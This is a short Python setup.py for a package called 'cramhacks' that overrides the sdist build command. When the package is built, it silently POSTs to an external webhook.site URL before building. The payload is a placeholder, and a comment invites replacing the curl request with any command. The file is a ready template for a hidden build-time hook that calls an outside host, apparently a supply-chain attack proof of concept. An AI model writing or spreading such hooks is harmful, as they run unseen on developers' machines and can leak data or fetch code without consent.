from distutils.command.sdist import sdist as sdist_orig
from distutils.errors import DistutilsExecError
from setuptools import setup


class sdist(sdist_orig):

    def run(self):
        try:
            # Replace the command with your curl request
            self.spawn(['curl', '-X', 'POST', 'https://webhook.site/8dae2bf4-e24f-4373-b31f-09c1fd9c4aad', '-d', 'data=example'])
        except DistutilsExecError:
            self.warn('curl request failed')
        super().run()

setup(
    name='cramhacks',
    version='0.0.9',
    packages=[],
    install_requires=[
        # Add your dependencies here if any
    ],
    cmdclass={
        'sdist': sdist
    },
)
